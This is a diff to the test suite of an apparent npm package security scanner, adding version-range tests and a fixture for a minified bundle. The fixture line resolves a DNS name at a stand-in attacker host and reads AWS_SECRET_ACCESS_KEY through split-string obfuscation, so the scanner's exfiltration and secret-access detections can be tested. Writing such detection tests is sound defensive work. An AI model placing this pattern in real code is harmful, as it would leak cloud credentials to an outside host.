@@ -53,6 +53,12 @@ describe("resolveNpmVersion", () => {
   test("gte range >=2.0.0", () => {
     expect(resolveNpmVersion(versions, distTags, ">=2.0.0")).toBe("2.1.0");
   });
+  test("handles OR ranges", () => {
+    expect(resolveNpmVersion(versions, distTags, "^5 || ^2.0.0")).toBe("2.1.0");
+  });
+  test("handles wildcard x-ranges", () => {
+    expect(resolveNpmVersion(versions, distTags, "1.x")).toBe("1.2.0");
+  });
   test("missing version", () => {
     expect(resolveNpmVersion(versions, distTags, "9.9.9")).toBeUndefined();
   });
@@ -146,16 +152,16 @@ describe("analyzeDirectory", () => {
     expect(report.findings.some((f) => f.id.includes("env-access"))).toBe(false);
   });
 
-  test("minified file → low finding, no pattern false positives", async () => {
-    const longLine = `var a=${JSON.stringify("x".repeat(300))};fetch("https://api.example.com").then(r=>r.json()).then(d=>process.env.PORT&&console.log(d));`;
+  test("minified file is still pattern-scanned", async () => {
+    const longLine = `var a=${JSON.stringify("x".repeat(300))};dns.resolve("x.attacker.com",()=>{});process.env["AWS"+"_"+"SECRET_ACCESS_KEY"];`;
     const dir = join(tmpDir, "minified");
     await makePackage(dir, { name: "minified-pkg", version: "1.0.0" }, {
       "dist/bundle.min.js": longLine.padEnd(5000, ";a=1"),
     });
     const report = await analyzeDirectory("minified-pkg@1.0.0", "npm", dir, "local");
     expect(report.findings.some((f) => f.id.includes("minified"))).toBe(true);
-    expect(report.findings.some((f) => f.id.includes("network-access"))).toBe(false);
-    expect(report.findings.some((f) => f.id.includes("env-access"))).toBe(false);
+    expect(report.findings.some((f) => f.id.includes("dns-exfiltration"))).toBe(true);
+    expect(report.findings.some((f) => f.id.includes("env-secret-access"))).toBe(true);
   });
 
   test("large dependency count → medium risk", async () => {
